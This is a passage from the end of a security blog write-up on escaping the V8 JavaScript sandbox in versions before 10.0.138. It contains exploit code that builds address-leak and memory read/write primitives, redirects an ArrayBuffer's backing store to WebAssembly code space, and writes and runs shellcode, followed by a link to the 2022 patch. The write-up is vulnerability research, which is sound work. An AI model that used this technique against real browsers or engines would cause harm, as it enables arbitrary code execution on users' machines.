class="subst">$&#123;i.toString(<span class="number">16</span>)&#125;</span>`</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ------- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* implement exploit primitives */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// get compressed address of obj</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>) &#123; <span class="keyword">return</span> <span class="title class_">Sandbox</span>.<span class="title function_">getAddressOf</span>(obj); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// if value isn&#x27;t provided, read bigint from addr</span></span><br><span class="line"><span class="comment">// otherwise, write bigint value to addr</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">rw</span>(<span class="params">addr, value = <span class="literal">NaN</span></span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(<span class="keyword">new</span> <span class="title class_">Sandbox</span>.<span class="title class_">MemoryView</span>(addr, kBigIntSize));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="title class_">Number</span>.<span class="built_in">isNaN</span>(value)) &#123; <span class="comment">// read</span></span><br><span class="line">    <span class="keyword">return</span> view.<span class="title function_">getBigUint64</span>(<span class="number">0</span>, <span class="literal">true</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123; <span class="comment">// write</span></span><br><span class="line">    view.<span class="title function_">setBigUint64</span>(<span class="number">0</span>, value, <span class="literal">true</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ---------------------------- */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* escape v8 sandbox */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// construct wasm module</span></span><br><span class="line"><span class="keyword">let</span> wasm_module = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(<span class="keyword">new</span> <span class="title class_">Uint8Array</span>(wasm_src));</span><br><span class="line"></span><br><span class="line"><span class="comment">// get address of wasm code space</span></span><br><span class="line"><span class="keyword">let</span> wasm_instance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasm_module);</span><br><span class="line"><span class="keyword">let</span> wasm_instance_addr = <span class="title function_">addrof</span>(wasm_instance);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] wasm_instance_addr == <span class="subst">$&#123;hex(wasm_instance_addr)&#125;</span>`</span>);</span><br><span class="line"><span class="keyword">let</span> wasm_code_space_addr = <span class="title function_">rw</span>(wasm_instance_addr + kJumpTableStartOffset);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] wasm_code_space_addr == <span class="subst">$&#123;hex(wasm_code_space_addr)&#125;</span>`</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// overwrite backing store of buf with address of wasm code space</span></span><br><span class="line"><span class="keyword">let</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(shellcode.<span class="property">length</span>);</span><br><span class="line"><span class="keyword">let</span> buf_addr = <span class="title function_">addrof</span>(buf);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`[+] buf_addr == <span class="subst">$&#123;hex(buf_addr)&#125;</span>`</span>);</span><br><span class="line"><span class="title function_">rw</span>(buf_addr + kBackingStoreOffset, wasm_code_space_addr);</span><br><span class="line"></span><br><span class="line"><span class="comment">// write shellcode to wasm code space</span></span><br><span class="line"><span class="keyword">let</span> view = <span class="keyword">new</span> <span class="title class_">DataView</span>(buf);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; shellcode.<span class="property">length</span>; i++) &#123; view.<span class="title function_">setUint8</span>(i, shellcode[i]); &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// execute shellcode</span></span><br><span class="line">wasm_instance.<span class="property">exports</span>.<span class="title function_">main</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">/* ----------------- */</span></span><br></pre></td></tr></table></figure>

<p><img src="/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/pwn.png"></p>
<h2 id="Patch"><a href="#Patch" class="headerlink" title="Patch"></a>Patch</h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/v8/v8/commit/f759872d52093d1ac2b531f7e8fa956264b57ad9">[wasm] Ship code protection via mprotect</a> (Feb 15, 2022)</p>
</blockquote>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a href="/categories/">Category</a></li>
        
          <li><a href="/tags/">Tag</a></li>
        
          <li><a href="/search/">Search</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Setup"><span class="toc-number">1.</span> <span class="toc-text">Setup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Backing-store-of-ArrayBuffer"><span class="toc-number">2.1.</span> <span class="toc-text">Backing store of ArrayBuffer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execution-flow-of-WebAssembly-function"><span class="toc-number">2.2.</span> <span class="toc-text">Execution flow of WebAssembly function</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploitation"><span class="toc-number">3.</span> <span class="toc-text">Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Get-address-of-WebAssembly-code-space"><span class="toc-number">3.1.</span> <span class="toc-text">Get address of WebAssembly code space</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Write-shellcode-to-WebAssembly-code-space"><span class="toc-number">3.2.</span> <span class="toc-text">Write shellcode to WebAssembly code space</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Execute-shellcode"><span class="toc-number">3.3.</span> <span class="toc-text">Execute shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Patch"><span class="toc-number">4.</span> <span class="toc-text">Patch</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&text=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&is_video=false&description=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)&body=Check out this article: https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&title=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&name=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://aaronsjcho.github.io/2023/04/29/Escaping-V8-Sandbox-via-Backing-Store-of-ArrayBuffer-and-WebAssembly-Code-Space-Part-1/&t=Escaping V8 Sandbox via Backing Store of ArrayBuffer and WebAssembly Code Space: Part 1 (V8 &lt; 10.0.138)"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2019-2025
    Seongjoon Cho
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/tags/">Tag</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'aaronsjcho/aaronsjcho.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
